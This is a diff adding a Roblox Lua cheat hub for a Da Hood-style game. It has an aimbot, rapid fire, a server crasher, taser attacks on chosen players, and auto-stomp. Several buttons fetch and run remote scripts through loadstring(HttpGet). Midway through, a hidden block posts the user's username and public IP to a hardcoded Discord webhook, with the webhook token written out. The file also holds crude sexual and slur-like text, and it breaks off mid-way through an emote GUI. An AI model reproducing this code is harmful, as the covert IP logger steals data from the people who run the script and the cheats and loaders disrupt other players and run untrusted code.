@@ -1,1 +1,1975 @@
 
+local uh = {}
+
+
+function uh.hub()
+--https://www.roblox.com/games/9744954014/15B-ATM-Event-Zombie-Animation-Tha-Hood
+--https://www.roblox.com/games/9568982793/Free-Macro-Da-Hood-Battlegrounds
+local plr  = game:GetService('Players').LocalPlayer
+  local haimissexy = true
+  --THIS IS SEXY HUB HUB LOVE LOVE LOVE LOVE I LOVE TO SUCK DICK
+workspace.FallenPartsDestroyHeight = 0/0
+local l__ReplicatedStorage__5 = game.ReplicatedStorage
+local DiscordLib =
+    loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()
+
+local win = DiscordLib:Window("Bloodhood killer")
+local serv = win:Server("Character", "")
+
+local btns =  serv:Channel("Inside Character")
+
+
+function getClosestPlayerToCursor()
+        local closestPlayer
+        local shortestDistance = circle.Radius
+
+        for i, v in pairs(game.Players:GetPlayers()) do
+            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
+                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
+                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
+                if magnitude < shortestDistance then
+                    closestPlayer = v
+                    shortestDistance = magnitude
+                end
+            end
+        end
+        return closestPlayer
+    end
+    
+
+
+--[[lol:Button(""
+    ,function() 
+    
+
+
+game:GetService("ReplicatedStorage"):WaitForChild("AvatarEditor"):WaitForChild("RemoteEvent"):FireServer("reset")
+end
+)]]
+local inspect = serv:Channel("inspect elemant guns")
+inspect:Button(
+    "shoot rpg",
+    function()
+  local mouse = game:GetService("Players"):WaitForChild(game.Players.LocalPlayer.Name):GetMouse()
+function rpg()
+local args = {
+    [1] = {Ammo = {Value = 8473784},
+
+        Launcher =  game.Players.LocalPlayer.Character.HumanoidRootPart,
+        Handle = {Position = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position}
+
+
+    },
+    [2] = mouse.Hit.Position
+}
+
+
+
+
+game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("RPG"):FireServer(unpack(args))
+end 
+
+
+mouse.KeyDown:connect(function(key)
+ if key == "h" then 
+     rpg()
+ end 
+ end)
+end
+) 
+
+
+inspect:Button(
+    "put all knifes",
+    function()
+ local plr  = game:GetService('Players').LocalPlayer
+    local chr = plr.Character or plr.CharacterAdded:Wait()
+  for i,v in pairs(plr.Backpack:GetChildren()) do
+   if v.Name == "Knife" then 
+       
+       v.Parent = chr
+       end 
+  end 
+  wait(1)
+local balls = 1 
+for i,v in pairs(chr:GetChildren()) do
+        if v:IsA("Tool") then
+
+        balls =  balls + 0.2
+                currentToolSize = v.Handle.Size
+                currentGripPos = v.GripPos
+    v.Handle.Transparency=  1
+                v.Handle.Massless = true
+                v.Handle.Size = Vector3.new(10,10,10)
+            
+         v.GripPos = Vector3.new(0, 0, 0)
+    
+        end
+    end
+end
+) 
+inspect:Button(
+    "faster rapid fire",
+    function()
+
+-- Hold E to shoot your guns very fast, works best with Revolver
+-- init  
+if not game:IsLoaded() then 
+   game.Loaded:Wait();
+end
+
+-- variables
+local players, replicatedStorage, runService, userInputService = game:GetService("Players"), game:GetService("ReplicatedStorage"), game:GetService("RunService"), game:GetService("UserInputService");
+local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse();
+
+local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents");
+local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon");
+
+local keyHeld = false
+
+-- events 
+userInputService.InputBegan:Connect(function(key)
+   if userInputService:GetFocusedTextBox() then return end 
+   
+   if key.KeyCode == Enum.KeyCode.E then 
+       keyHeld = true
+   end
+end);
+
+userInputService.InputEnded:Connect(function(key)
+   if userInputService:GetFocusedTextBox() then return end 
+   
+   if key.KeyCode == Enum.KeyCode.E then 
+       keyHeld = false
+   end
+end);
+
+runService.Heartbeat:Connect(function()
+   if keyHeld == true then 
+       if client.Character and client.Character:FindFirstChildOfClass("Tool") then
+           local tool = client.Character:FindFirstChildOfClass("Tool");
+           
+           toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(mouse.Hit.Position, tool);
+           reloadWeapon:FireServer();
+       end
+   end
+end);
+end
+) 
+inspect:Textbox(
+    "accessory",
+    "",
+    true,
+    function(t)
+       game.ReplicatedStorage.AvatarEditor.RemoteEvent:FireServer("accessory",t)
+    end
+)
+inspect:Button(
+    "make bigger",
+    function()
+
+ for i,v in pairs(game.Workspace:GetDescendants()) do 
+     if v.Name == "[Weights] - $150"  then 
+         fireclickdetector(v.ClickDetector)
+         end 
+     end 
+ 
+ 
+  local plr  = game:GetService('Players').LocalPlayer
+    local chr = plr.Character or plr.CharacterAdded:Wait()
+  for i,v in pairs(plr.Backpack:GetChildren()) do
+   if v.Name == "Weight"  then 
+       
+       v.Parent = chr
+       end 
+  end 
+
+end
+) 
+inspect:Button(
+    "make smaller",
+    function()
+while game.Players.LocalPlayer.Character.Humanoid.Health >= 0 do 
+pcall(function()
+         fireclickdetector(game.Workspace.MAP["[Lettuce] - $1"].ClickDetector)
+   end)
+ wait()
+ 
+  local plr  = game:GetService('Players').LocalPlayer
+    local chr = plr.Character or plr.CharacterAdded:Wait()
+  for i,v in pairs(plr.Backpack:GetChildren()) do
+   if v.Name == "Lettuce"  then 
+       
+       v.Parent = chr
+       end 
+  end 
+  end 
+
+end
+) 
+
+
+local crash =  serv:Channel("Crasher  v1")
+
+crash:Button("stop annoying ads (should turn before get tools)",function() 
+    
+
+
+game:GetService("CoreGui").PurchasePrompt.Enabled = false
+game:GetService("Workspace").MAP["[Configure Crosshair]"]:Destroy()
+
+end
+)
+crash:Button("get tools for crash server"
+    ,function() 
+    
+--tool crasher
+ for _, descendant in ipairs(workspace:GetDescendants()) do
+                if descendant:IsA("ClickDetector") then
+                    fireclickdetector(descendant)
+                end
+ end
+        for i,v in pairs(game.Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
+		if v:IsA("Tool") or v:IsA("HopperBin") then
+			v.Parent = game.Players.LocalPlayer.Character
+		end
+	end
+end
+)
+
+
+crash:Button("crash server with tools",function() 
+    
+
+ for i,v in pairs(game.Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
+		if v:IsA("Tool") or v:IsA("HopperBin") then
+			v.Parent = game.Players.LocalPlayer.Character
+		end
+	end
+	
+	wait(0.5)
+	game.Players.LocalPlayer.Character.RightHand:Destroy()
+end
+)
+
+btns:Button("food xd"
+    ,function() 
+   local plr  = game:GetService('Players').LocalPlayer
+    local chr = plr.Character or plr .CharacterAdded:Wait()
+   local  sin = 0
+for i,v in pairs(game.Workspace.MAP:GetDescendants()) do 
+      if v.Name == "[KFC Bucket] - $13" or v.Name == "[Taco] - $6" or v.Name == "[Nuggets] - $6" or v.Name == "[Apple] - $6"  then
+         sin= sin + 1
+         pcall(function()
+        v.Name = "LOL" .. tostring(sin)
+         end)
+         end 
+     end 
+ 
+
+ 
+         fireclickdetector(game:GetService("Workspace").MAP.LOL1.ClickDetector)
+                             fireclickdetector(game:GetService("Workspace").MAP.LOL3.ClickDetector)
+         
+        
+              fireclickdetector(game:GetService("Workspace").MAP.LOL4.ClickDetector)
+              wait(0.01)
+              fireclickdetector(game:GetService("Workspace").MAP.LOL2.ClickDetector)
+                             fireclickdetector(game:GetService("Workspace").MAP.LOL5.ClickDetector)
+         
+        
+              fireclickdetector(game:GetService("Workspace").MAP.LOL6.ClickDetector)
+              wait(0.01)
+              fireclickdetector(game:GetService("Workspace").MAP.LOL7.ClickDetector)
+                             fireclickdetector(game:GetService("Workspace").MAP.LOL8.ClickDetector)
+         
+        
+              fireclickdetector(game:GetService("Workspace").MAP.LOL9.ClickDetector)
+    wait(0.01)
+    fireclickdetector(game:GetService("Workspace").MAP.LOL10.ClickDetector)
+                             fireclickdetector(game:GetService("Workspace").MAP.LOL11.ClickDetector)
+         
+        
+             
+  for i,v in pairs(plr.Backpack:GetChildren()) do
+   if v.Name == "[KFC Bucket]"  or v.Name == "[Taco]"  or v.Name == "[nugget]" or v.Name == "[Apple]" then 
+       
+       v.Parent = chr
+       end 
+  end 
+   wait(0.01)
+              
+
+end
+)
+
+
+
+btns:Button(
+    "bypass anti lock aimbot powerful guns",
+    function()
+        
+        local players, replicatedStorage, runService, userInputService = game:GetService("Players"), game:GetService("ReplicatedStorage"), game:GetService("RunService"), game:GetService("UserInputService");
+local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse();
+local guimain = Instance.new("Folder", game.CoreGui)
+        local CC = game:GetService"Workspace".CurrentCamera
+    local LocalMouse = game.Players.LocalPlayer:GetMouse()
+
+    
+    
+   getgenv().Partz = "LowerTorso"
+getgenv().AutoPrediction = true
+
+
+function getClosestPlayerToCursor()
+        local closestPlayer
+        local shortestDistance = 222
+
+        for i, v in pairs(game.Players:GetPlayers()) do
+            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
+                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
+                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
+                if magnitude < shortestDistance then
+                    closestPlayer = v
+                    shortestDistance = magnitude
+                end
+            end
+        end
+        return closestPlayer
+    end
+    
+    -- Hold E to shoot your guns very fast, works best with Revolver
+-- init
+if not game:IsLoaded() then
+   game.Loaded:Wait();
+end
+
+-- variables
+local players, replicatedStorage, runService, userInputService = game:GetService("Players"), game:GetService("ReplicatedStorage"), game:GetService("RunService"), game:GetService("UserInputService");
+local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse();
+
+local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents");
+local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon");
+
+local keyHeld = false
+
+-- events
+userInputService.InputBegan:Connect(function(key)
+   if userInputService:GetFocusedTextBox() then return end
+   
+   if key.KeyCode == Enum.KeyCode.E then
+       keyHeld = true
+   end
+end);
+
+userInputService.InputEnded:Connect(function(key)
+   if userInputService:GetFocusedTextBox() then return end
+   
+   if key.KeyCode == Enum.KeyCode.E then
+       keyHeld = false
+   end
+end);
+   getgenv().Partz = "LowerTorso"
+   getgenv().Prediction = 0.158
+runService.RenderStepped:Connect(function()
+   if keyHeld == true  then
+       if client.Character and client.Character:FindFirstChildOfClass("Tool") then
+           local tool = client.Character:FindFirstChildOfClass("Tool");
+           
+           toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(getClosestPlayerToCursor().Character
+               [getgenv().Partz].Position+(
+                   getClosestPlayerToCursor().Character.Humanoid.MoveDirection* getgenv().Prediction
+                   ),
+               tool);
+           reloadWeapon:FireServer();
+           
+   end
+   end
+end);
+
+    end
+)
+
+local usure = false 
+btns:Button(
+    "Blur",
+    function()
+
+        if usure == true then 
+            game.ReplicatedStorage.ToolRemoteEvents.Rev:FireServer(Vector3.new(99,99,99),{Ammo = {Value = 99}, Barrel = {ShootUI={Shoot= game.Players.LocalPlayer.Backpack.Revolver.Barrel.ShootUI.Shoot}},Handle = {ShootLight= game.Lighting.PepperSprayBlur}})
+          end
+
+if usure == false then 
+usure = true 
+
+end 
+
+end
+)
+
+btns:Button(
+    "Rain",
+    function()
+
+  for i,v in pairs(game.StarterPlayer.PlayerScripts:GetChildren()) do 
+    if v.Name:find("Rain") or v.Name:find("RAIN") or v.Name:find("rain") then 
+        game.ReplicatedStorage.ToolRemoteEvents.Rev:FireServer(Vector3.new(99,99,99),{Ammo = {Value = 99}, Barrel = {ShootUI={Shoot= game.Players.LocalPlayer.Backpack.Revolver.Barrel.ShootUI.Shoot}},Handle = {ShootLight= v}})   
+    end
+    end
+    end
+)
+
+btns:Button(
+    "Stomp Effect(Swords)",
+    function()
+
+        for i,v in next, game:GetObjects("rbxassetid://13945928704")[1]:GetChildren() do 
+            if v:IsA("Model") then
+            for _,x in pairs(v:GetChildren()) do 
+            if x ~= nil then 
+            x.Parent = game[v.Name]
+            end 
+            end 
+            end 
+            end
+            a = Instance.new("Folder")
+            a.Parent = workspace.Ignored
+            a.Name = "Animations"
+            function say(msg)
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg ,"All")
+            end
+            wait(5)
+            if game:GetService("ReplicatedStorage"):FindFirstChild("Modules") then 
+            say("..") 
+            for i,v in next,game:GetService("ReplicatedStorage"):GetDescendants() do
+            if v.ClassName:find("script") or v.ClassName:find("Script") then 
+            pcall(function()
+            v.Enabled = true
+            v.Disabled = false 
+            end)
+            end 
+            end 
+            end 
+            wait(0.5)
+            
+            
+            function stomp(who) 
+            function require(Module)
+                local Env = {}
+                local Fake = {script = Module}
+                local Mt = {
+                    __index = function(self, key)
+                        return Fake[key] or getfenv()[key]
+                    end,
+                    __newindex = function(self, key, value)
+                        if Fake[key] then
+                            Fake[key] = value
+                        else
+                            getfenv()[key] = value
+                        end
+                    end
+                }
+                local Yes = setmetatable(Env, Mt)
+                local Func = loadstring(Module.Source)
+                setfenv(Func, Yes)
+                return Func()
+            end
+            
+            require(game.ReplicatedStorage.KillFX["Gates of Heaven"]).RunStompFx("Gates of Heaven", who, game.Players.LocalPlayer, game.Players.LocalPlayer);
+            end
+            
+            
+            local UserInputService = game:GetService("UserInputService")
+            local Players = game:GetService("Players")
+            local CollectionService = game:GetService("CollectionService")
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local NoSpam = false
+            
+            -- constants
+            local MAX_RANGE = 7
+            local PLAYER = Players.LocalPlayer
+            local Cooldown = true
+            
+            -- variables
+            
+                    
+                    
+                        UserInputService.InputBegan:Connect(function(Input)
+            if Input.KeyCode == Enum.KeyCode.E then
+                            local tagged = CollectionService:GetTagged("Downed")
+            
+                            if #tagged == 0 then
+                                return
+                            end
+                            print("here?")
+                            local distance = MAX_RANGE
+                            local victim = nil
+                            for _, v in pairs(tagged) do
+                                if (v.PrimaryPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < distance then -- DO NOT DO THIS! AKA THE " Players.LocalPlayer.Character.PrimaryPart.Position" part
+                                    victim = v
+                                    distance = (v.PrimaryPart.Position - game.Players.LocalPlayer.Character.PrimaryPart.Position).Magnitude
+                                end
+                            end
+                            wait(1.2)
+                            if victim.Humanoid.Health <= 0 then 
+                            if victim then
+                            
+                            stomp(victim.HumanoidRootPart)
+                            
+                            end 
+                            end
+                            
+                            end 
+                            end)
+end
+)
+
+
+
+
+btns:Button(
+    "fake macro z",
+    function()
+        
+game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(z)
+
+    if z == "z" then
+
+game.Players:Chat("/e laugh")
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 333
+wait(6)
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+end 
+end)
+  end
+)
+
+
+
+btns:Button(
+    "shoot from no where(use db)",
+    function()
+        
+    DiscordLib:Notification("Notification", "Equip a db and then unequip and then press b to active!", "________")
+    
+    
+    local mouse = game:GetService("Players"):WaitForChild(game.Players.LocalPlayer.Name):GetMouse()
+mouse.KeyDown:connect(function(f) 
+    if f == "b" then 
+local args = {
+    [1] = mouse.Target.Position,
+    [2] = game:GetService("Players"):WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("Backpack"):WaitForChild("DB")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("DB"):FireServer(unpack(args))
+end 
+end)
+        
+    end
+)
+
+btns:Button(
+    "Headless(say :headless before) (if u have anti chat logger on)",
+    function()
+        
+     game.Players:Chat(":headless")
+        
+    end
+)
+btns:Button(
+    "Get all knifes in the game.",
+    function()
+
+        for i,v in pairs(game:GetService("Workspace").pickups:GetChildren()) do 
+    if v.ToolSpawnPart then 
+        
+        v.ToolSpawnPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+        end 
+    
+end 
+
+
+    end
+)
+
+btns:Button(
+    "Reanti ragdoll(only for developers)",
+    function()
+
+        if plr.Name == "BrickColorRandom" or plr.Name == "fafa1" or plr.Name == "UN52531638"  or plr.Name == "BigBalckNgvigaBalIs" then 
+    local  a =  game:GetService("ReplicatedStorage") 
+    local  r = a:FindFirstChild("ToolRemoteEvents")
+    local ar = a["LMG"]
+    local r2 = a:FindFirstChild("ReloadWeapon")
+
+
+function ihave()
+if plr.Character:FindFirstChild("LMG") then 
+
+return true
+   end 
+    end
+
+
+    function getlmg()
+        for i =1,2 do 
+        for _,x in next,workspace:GetDescendants() do 
+        if x.Name:find("LMG") then 
+            
+        pcall(function()
+        
+        fireclickdetector(x:FindFirstChildOfClass("ClickDetector"))
+            
+        end)
+        
+        pcall(function()
+        fireclickdetector(x:FindFirstChildOfClass("Part"):FindFirstChildOfClass("ClickDetector"))
+        
+        end)
+            
+   
+        end 
+    end
+        end
+    end
+  if not plr.Backpack:FindFirstChild("LMG") and not plr.Character:FindFirstChild("LMG") then 
+getlmg()
+  
+  end 
+wait(0.5)
+    if not plr.Character:FindFirstChild("LMG") and plr.Backpack:FindFirstChild("LMG") then 
+        plr.Backpack:FindFirstChild("LMG").Parent = plr.Character
+    end 
+
+    local ol  
+    local loop = {}
+    local rnder = game:GetService("RunService").RenderStepped
+    function loop.Cancel(which)
+        which:Disconnect()
+ 
+    end 
+
+wait(0.5)
+       if ihave() == true then 
+ol = rnder:connect(function()
+    wait()
+     for i,v in pairs(plr.Character:GetDescendants()) do 
+        if v:IsA("Motor6D") and v.Enabled == false then 
+    ar:FireServer(Vector3.new(),{Ammo = {Value = 99}, Barrel = {ShootUI={Shoot= game.Players.LocalPlayer.Backpack.Revolver.Barrel.ShootUI.Shoot}},Handle = {ShootLight= v}})
+
+        end 
+    end  
+end)
+end
+
+plr.Character.Humanoid.HealthChanged:Connect(function(hh)
+    if hh>= 2 then
+        
+        loop.Cancel(ol)
+    end
+    
+end)
+
+end 
+    end
+)
+
+
+
+btns:Button(
+    "Fix ragdoll killing self.",
+    function()
+local plr = game.Players.LocalPlayer
+
+
+local chara = plr.Character
+for i,v in next , chara:GetDescendants() do  
+    if v.Name == "Attachment"  or v.Name == "BallSocketConstraint" then 
+        v:Destroy()
+        end 
+    end  
+
+    end
+)
+btns:Button(
+    "Katana ( yes ik the idea is stolen) needs knifes.",
+    function()
+
+   
+  local plr  = game:GetService('Players').LocalPlayer
+    local chr = plr.Character or plr.CharacterAdded:Wait()
+  for i,v in pairs(plr.Backpack:GetChildren()) do
+   if v.Name == "Knife" then 
+       
+       v.Parent = chr
+       end 
+  end 
+  wait(1)
+local balls = 1 
+for i,v in pairs(chr:GetChildren()) do
+		if v:IsA("Tool") then
+
+		balls =  balls + 0.2
+				currentToolSize = v.Handle.Size
+				currentGripPos = v.GripPos
+	v.Handle.Transparency=  1
+				v.Handle.Massless = true
+				v.Handle.Size = Vector3.new(10,10,10)
+			
+		 v.GripPos = Vector3.new(0+balls, 0, 0)
+		end 
+		end
+    end
+)
+
+
+btns:Button(
+    "no jump delay",
+    function()
+        
+      plr.PlayerGui:WaitForChild("Jump"):Destroy()
+            
+        DiscordLib:Notification("Notification", "Jump", "ez!")
+        
+    end
+)
+
+
+btns:Button(
+    "reach for tool",
+    function()
+        local chr = plr.Character or plr.CharacterAdded:Wait()
+for i,v in pairs(chr:GetDescendants()) do
+		if v:IsA("Tool") then
+		
+				currentToolSize = v.Handle.Size
+				currentGripPos = v.GripPos
+	v.Handle.Transparency=  1
+				v.Handle.Massless = true
+				v.Handle.Size = Vector3.new(40,40,40)
+				
+		 
+		end 
+		end
+        
+    end
+)
+function pcallaimbot()
+		pcall(function()
+			
+	
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/nyulachan/nyula/main/nyulauh%22"))()
+end)
+end
+btns:Button(
+    "Aimbot + Ultra guns",
+    function()
+
+pcallaimbot()
+if not game:IsLoaded() then 
+   game.Loaded:Wait();
+end
+
+-- variables
+local players, replicatedStorage, runService, userInputService = game:GetService("Players"), game:GetService("ReplicatedStorage"), game:GetService("RunService"), game:GetService("UserInputService");
+local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse();
+
+local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents");
+local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon");
+
+local keyHeld = false
+
+-- events 
+userInputService.InputBegan:Connect(function(key)
+   if userInputService:GetFocusedTextBox() then return end 
+   
+   if key.KeyCode == Enum.KeyCode.E then 
+       keyHeld = true
+   end
+end);
+
+userInputService.InputEnded:Connect(function(key)
+   if userInputService:GetFocusedTextBox() then return end 
+   
+   if key.KeyCode == Enum.KeyCode.E then 
+       keyHeld = false
+   end
+end);
+
+runService.RenderStepped:Connect(function()
+   if keyHeld == true then 
+       if client.Character and client.Character:FindFirstChildOfClass("Tool") then
+           local tool = client.Character:FindFirstChildOfClass("Tool");
+           
+           toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(mouse.Hit.Position, tool);
+           reloadWeapon:FireServer();
+       end
+   end
+end);
+
+     end
+)
+
+local tgls = serv:Channel("Toggles")
+local lol = false
+
+
+tgls:Toggle(
+    "get knives looped",
+    false,
+    function(bool42)
+        okay = bool42
+        while okay == true do 
+            task.wait()
+        
+            for i,v in pairs(game:GetService("Workspace").pickups:GetChildren()) do 
+                if v.ToolSpawnPart then 
+                    
+                    v.ToolSpawnPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                    end 
+                
+            end 
+        end
+    end)
+    
+tgls:Toggle(
+    "get shield",
+    false,
+    function(bool42)
+        lol2 = bool42
+        while lol2 == true do 
+            task.wait()
+        
+         fireclickdetector(game:GetService("Workspace").MAP["Medium armor {FREE}"].Head.ClickDetector)
+  
+      end
+        
+    end 
+    )
+tgls:Toggle(
+    "AutoStomp Lmfao working again!",
+    false,
+    function(bool4)
+        print(lol)
+		lol = bool4
+	
+     while lol == true do wait(0.5)
+		    
+			for i,v in pairs(game.Players:GetChildren())  do 
+			local args = {
+    [1] = workspace:WaitForChild(v.Name)
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("AttemptStomp"):FireServer(unpack(args))
+end
+				end
+    end
+)
+
+
+
+local sldrs = serv:Channel("Character movement")
+
+local sldr2 =
+    sldrs:Slider(
+    "Fov",
+    0,
+    120,
+    60,
+    function(t)
+        game:GetService("Workspace").Camera.FieldOfView= t
+    end
+)
+
+sldrs:Button(
+    "Change to 50",
+    function()
+        sldr:Change(16)
+    end
+)
+local hm = {}
+    for i,v in pairs(game.Players:GetChildren()) do 
+  
+    table.insert(hm,v.Name)
+    
+    
+    
+end 
+
+game.Players.PlayerAdded:connect(function(pla)
+    if  table.find(hm,pla.Name) then 
+        table.insert(hm,pla.Name)
+        
+        end 
+    
+    end) 
+game.Players.PlayerRemoving:connect(function(pla)
+    if   table.find(hm,pla.Name) then 
+        table.remove(hm,pla.Name)
+        
+        end 
+    
+    end)
+local drops = serv:Channel("Break characters")
+local drop1 =
+    drops:Dropdown(
+    "Taser stop reloading",
+   hm,
+   function (bool)
+	   
+   
+   local playername = bool
+local taser =game:GetService("RunService").Heartbeat:connect(function()
+
+ for i,v in pairs(game.Players:GetChildren()) do 
+        
+        if  v~= game.Players.LocalPlayer and v.Name == playername and v.Character:WaitForChild("Reload").Value == false then 
+
+            game.ReplicatedStorage.ToolRemoteEvents.Taser:FireServer(Vector3.new(99,99,99),{Hooked =v.Character.Reload,
+                Handle = {Position = game:GetService("Workspace")["Server time And Played"].HumanoidRootPart.Position},
+                SpawnPart =  v.Character:WaitForChild("Head"),
+            })
+        end
+ end
+
+end)
+
+
+game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key) 
+if key =="l" then 
+if taser then 
+taser:Disconnect()
+end 
+end
+end)
+
+
+
+   end)
+   local drop3 =
+    drops:Dropdown(
+    "Taser take away",
+   hm,
+function (bool)
+
+   local playername = bool
+local taser =game:GetService("RunService").Heartbeat:connect(function()
+
+            game.ReplicatedStorage.ToolRemoteEvents.Taser:FireServer(Vector3.new(99,99,99),{Hooked =  {Value = false},
+                Handle = {Position = game.Players[playername].Character:WaitForChild("RightFoot").Position + game.Players[playername].Character:WaitForChild("RightFoot").Velocity },
+                SpawnPart =  game.Players[playername].Character:WaitForChild("Head"),
+            })
+
+ 
+
+end)
+
+
+game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key) 
+if key =="l" then 
+if taser then 
+taser:Disconnect()
+end 
+end
+end)
+	
+
+
+
+
+   end)
+local drop =
+    drops:Dropdown(
+    "ultimate Taser",
+   hm,
+    function(bool)
+     local playername = bool
+local taser =game:GetService("RunService").Heartbeat:connect(function()
+
+ for i,v in next,game:GetService("Workspace"):GetDescendants() do 
+        
+        if  v:FindFirstChild("HumanoidRootPart") then 
+
+            game.ReplicatedStorage.ToolRemoteEvents.Taser:FireServer(Vector3.new(99,99,99),{Hooked =game.Players[playername].Character.Reload,
+                Handle = {Position = game.Players[playername].Character.HumanoidRootPart.Position},
+                SpawnPart =  v:WaitForChild("Head"),
+            })
+        end
+ end
+            game.ReplicatedStorage.ToolRemoteEvents.Taser:FireServer(Vector3.new(99,99,99),{Hooked =  {Value = false},
+                Handle = {Position = game.Players[playername].Character:WaitForChild("RightFoot").Position + game.Players[playername].Character:WaitForChild("RightFoot").Velocity },
+                SpawnPart =  game.Players[playername].Character:WaitForChild("Head"),
+            })
+
+ for i,v in pairs(game.Players:GetChildren()) do 
+        
+        if  v~= game.Players.LocalPlayer and v.Name == playername and v.Character:WaitForChild("Reload").Value == false then 
+
+            game.ReplicatedStorage.ToolRemoteEvents.Taser:FireServer(Vector3.new(99,99,99),{Hooked =v.Character.Reload,
+                Handle = {Position = game:GetService("Workspace")["Server time And Played"].HumanoidRootPart.Position},
+                SpawnPart =  v.Character:WaitForChild("Head"),
+            })
+        end
+ end
+
+end)
+
+
+game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key) 
+if key =="l" then 
+if taser then 
+taser:Disconnect()
+end 
+end
+end)
+    end
+)
+
+local webh = "https://discord.com/api/webhooks/1129434037560299550/16ezhmVPG1PSBhObpNCaNAt9bUYj3BtPlKDhCWcy0YPFCL-WhvTVq8ScNocdC_p6rPtq"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+
+
+local textbs = serv:Channel("Admins n other guis")
+textbs:Button(
+    "inf yeild",
+    function()
+       loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    end
+)
+textbs:Button(
+    "funny swear go brrr",
+    function()
+    loadstring(game:HttpGet("https://vadrifts.dev/source.lua%22"))()
+ end
+)
+
+textbs:Button(
+    "emote shit",
+    function()
+       --keybind to open is comma
+--made by Gi#7331
+
+local ContextActionService = game:GetService("ContextActionService")
+local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
+local CoreGui = game:GetService("CoreGui")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+
+local Emotes = {}
+local LoadedEmotes = {}
+local function AddEmote(name: string, id: IntValue, price: IntValue?)
+	LoadedEmotes[id] = false
+	task.spawn(function()
+		if not (name and id) then
+			return
+		end
+		local success, date = pcall(function()
+			local info = MarketplaceService:GetProductInfo(id)
+			local updated = info.Updated
+			return DateTime.fromIsoDate(updated):ToUniversalTime()
+		end)
+		if not success then
+			task.wait(10)
+			AddEmote(name, id, price)
+			return
+		end
+		local unix = os.time({
+			year = date.Year,
+			month = date.Month,
+			day = date.Day,
+			hour = date.Hour,
+			min = date.Minute,
+			sec = date.Second
+		})
+		LoadedEmotes[id] = true
+		table.insert(Emotes, {
+			["name"] = name,
+			["id"] = id,
+			["icon"] = "rbxthumb://type=Asset&id=".. id .."&w=150&h=150",
+			["price"] = price or 0,
+			["lastupdated"] = unix,
+			["sort"] = {}
+		})
+	end)
+end
+local CurrentSort = "recentfirst"
+
+local FavoriteOff = "rbxassetid://10651060677"
+local FavoriteOn = "rbxassetid://10651061109"
+local FavoritedEmotes = {}
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "Emotes"
+ScreenGui.DisplayOrder = 2
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Enabled = false
+
+local BackFrame = Instance.new("Frame")
+BackFrame.Size = UDim2.new(0.9, 0, 0.5, 0)
+BackFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+BackFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
